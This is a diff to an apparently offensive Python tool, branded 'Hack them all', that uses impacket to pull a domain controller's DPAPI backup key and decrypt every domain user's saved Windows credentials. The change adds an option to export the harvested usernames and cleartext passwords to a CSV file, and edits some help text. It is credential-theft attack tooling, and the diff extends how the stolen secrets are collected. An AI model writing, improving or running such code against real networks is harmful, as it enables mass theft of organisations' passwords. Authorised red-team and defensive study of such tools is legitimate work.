@@ -37,7 +37,6 @@ from datetime import datetime
 from impacket.ese import getUnixTime
 import hashlib
 
-
 sys.tracebacklimit = 0
 
 
@@ -46,7 +45,7 @@ sys.tracebacklimit = 0
 def main():
 	print("\n██░ ██ ▓█████  ██ ▄█▀▄▄▄     ▄▄▄█████▓ ▒█████   ███▄ ▄███▓ ▄▄▄▄   \n▓██░ ██▒▓█   ▀  ██▄█▒▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ \n▒██▀▀██░▒███   ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒ ▄██\n░▓█ ░██ ▒▓█  ▄ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██    ▒██ ▒██░█▀  \n░▓█▒░██▓░▒████▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓\n ▒ ░░▒░▒░░ ▒░ ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒\n ▒ ░▒░ ░ ░ ░  ░░ ░▒ ▒░ ▒   ▒▒ ░   ░      ░ ▒ ▒░ ░  ░      ░▒░▒   ░ \n ░  ░░ ░   ░   ░ ░░ ░  ░   ▒    ░      ░ ░ ░ ▒  ░      ░    ░    ░ \n ░  ░  ░   ░  ░░  ░        ░  ░            ░ ░         ░    ░      \n   Because Domain Admin rights are not enough.\n\t\tHack them all.\n\n\t         @Processus\n**************************************************\n\n")
 
-	parser = argparse.ArgumentParser(add_help = True, description = "Script used to automate domain computers and users extraction and the \nexported domain backup keys from DC to collect and decrypt all users' DPAPI secrets \nsaved in Windows credential manager.")
+	parser = argparse.ArgumentParser(add_help = True, description = "Script used to automate domain computers and users extraction from LDAP and extraction of domain controller private key through RPC to collect and decrypt all users' DPAPI secrets saved in Windows credential manager.")
 
 	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address of DC>')
 
@@ -54,7 +53,7 @@ def main():
 	auth.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
 
 	options = parser.add_argument_group('authentication')
-	options.add_argument('-pvk', action='store', help='domain backup keys file')
+	options.add_argument('-pvk', action='store', help='\t\t\t\t\t\t\t\t\t\tdomain backup keys file')
 	options.add_argument('-dns', action="store", help='DNS server IP address to resolve computers hostname')
 	options.add_argument('-dnstcp', action="store_true", help='Use TCP for DNS connection')
 	options.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="port", help='port to connect to SMB Server')
@@ -63,6 +62,7 @@ def main():
 	options.add_argument('-md5', action="store_true", help='Print md5 hash insted of clear passwords')
 	
 	verbosity = parser.add_argument_group('verbosity')
+	verbosity.add_argument('-csv', action="store_true", help='Export results to CSV file')
 	verbosity.add_argument('-debug', action="store_true", help='Turn DEBUG output ON')
 	verbosity.add_argument('-debugmax', action="store_true", help='Turn DEBUG output TO MAAAAXXXX')
 
@@ -527,23 +527,35 @@ def main():
 								pass
 		if len(array_of_credentials) > 0:
 			if options.debug is True:
-				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n\n")
+				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n")
 			i = 0
-			for credential in array_of_credentials:
-				if i == 0:
+			if options.csv is True:
+				with open(directory + '/exported_credentials.csv', 'w', encoding='UTF8') as f:
+					header = "Found on;Session username;LastWritten;Target;Username;Password 1;Password 2\n"
+					f.write(header)
+					for credential in array_of_credentials:
+						i = i + 1
+						current_row = str(credential['foundon']) +";"+ str(credential['inusersession'])+";"+  str(credential['lastwritten'])+";"+ str(credential['target'])+";"+ str(credential['username'])+";"+  str(credential['password1'])+";"+ str(credential['password2'])+"\n"
+						f.write(current_row)
+				print("File successfully saved to ./" + str(directory) + '/exported_credentials.csv')
+			else:	
+				for credential in array_of_credentials:
+					if i == 0:
+						print("***********************************************")
+						i = i + 1
+					print("Found on : " + str(credential['foundon']))
+					print("Session username : " + str(credential['inusersession']))
+					print("LastWritten : " + str(credential['lastwritten']))
+					print("Target : " + str(credential['target']))
+					print("Username : " + str(credential['username']))
+					if len(credential['password1']) > 0:
+						print("Password 1 : " + str(credential['password1']))
+						print("Password 2 : " + str(credential['password2']))
+					else:
+						print("Password : " + str(credential['password2']))
 					print("***********************************************")
-					i = i + 1
-				print("Found on : " + str(credential['foundon']))
-				print("Session username : " + str(credential['inusersession']))
-				print("LastWritten : " + str(credential['lastwritten']))
-				print("Target : " + str(credential['target']))
-				print("Username : " + str(credential['username']))
-				if len(credential['password1']) > 0:
-					print("Password 1 : " + str(credential['password1']))
-					print("Password 2 : " + str(credential['password2']))
-				else:
-					print("Password : " + str(credential['password2']))
-				print("***********************************************")
+				
+				
 		else:
 			print("No credentials could be decrypted.")
 			os._exit(1)
